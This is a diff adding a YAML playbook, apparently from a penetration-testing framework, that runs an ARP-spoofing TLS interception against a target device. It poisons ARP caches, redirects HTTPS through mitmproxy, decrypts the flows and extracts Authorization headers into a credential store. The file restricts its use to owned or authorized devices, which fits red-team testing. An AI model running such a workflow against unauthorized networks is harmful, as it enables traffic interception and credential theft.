@@ -1,0 +1,60 @@
+name: tls_intercept_session
+description: >
+  Active TLS interception against a single target device you own. ARP-spoofs
+  the target to redirect its traffic through mitmproxy on the attacker host,
+  intercepts HTTPS sessions, then parses the flow dump for session reconstruction.
+
+  REDTEAM engagement level required — ARP spoofing is active network
+  manipulation. Run only against devices you own or have explicit written
+  authorization for. Teardown is automatic: iptables rule is removed, ARP
+  tables are restored, and net.ipv4.ip_forward is reset at end of duration.
+
+tags: [network, tls, mitm, active, exploitation, redteam]
+
+variables:
+  interface: "eth0"         # egress interface for ARP spoof + interception
+  target_ip: ""             # IP of the device to intercept (required)
+  gateway_ip: ""            # IP of the default gateway (required)
+  listen_port: "8080"       # local port mitmproxy will bind to
+  duration: "300"           # seconds to run the intercept session
+  output_dir: "/tmp/protopen/tls_sessions"
+
+steps:
+
+  # ── Phase gate ───────────────────────────────────────────────────────────────
+  - name: phase_exploitation
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: exploitation
+    on_fail: continue
+
+  # ── ARP spoof + TLS intercept ─────────────────────────────────────────────────
+  # Poisons the ARP cache of target_ip (pointing gateway → attacker) and
+  # gateway_ip (pointing target → attacker), redirects port 443 → mitmproxy,
+  # and writes decrypted flow data to output_dir/flows.dump.
+  # ARP tables are restored and iptables rule removed when duration expires.
+  - name: tls_intercept
+    tool: traffic_analysis
+    action: tls_intercept
+    params:
+      interface: "${interface}"
+      target_ip: "${target_ip}"
+      gateway_ip: "${gateway_ip}"
+      listen_port: "${listen_port}"
+      duration: "${duration}"
+    timeout: 360
+    on_fail: continue
+
+  # ── Session reconstruction ────────────────────────────────────────────────────
+  # Reassembles TCP streams from the flow dump and extracts HTTP sessions —
+  # request method, URI, Host, Authorization headers, body preview.
+  # Sessions with auth headers are ingested into target_store as credentials.
+  - name: reconstruct_sessions
+    tool: traffic_analysis
+    action: session_reconstruct
+    params:
+      pcap_file: "${output_dir}/flows.dump"
+      output_dir: "${output_dir}/sessions"
+    timeout: 120
+    on_fail: continue
